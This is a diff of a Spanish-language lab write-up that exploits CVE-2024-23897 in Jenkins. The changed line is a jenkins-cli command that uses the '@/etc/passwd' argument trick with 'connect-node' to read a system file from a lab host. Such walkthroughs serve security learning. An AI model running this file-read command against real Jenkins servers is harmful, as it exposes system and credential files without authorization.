@@ -105,8 +105,10 @@ git clone https://github.com/CKevens/CVE-2024-23897.git
 ```
 - Con este comando podemos enlistar mas información
 ```
-java -jar jenkins-cli.jar -s https://www.10.10.11.10:8080 @/etc/passwd
+java -jar jenkins-cli.jar -s https://www.10.10.11.10:8080 connect-node @/etc/passwd
 ```
+
+
 
 - Si no funciona de esa manera abrimos el burpsuite para ver un poco mas de información 
 ```
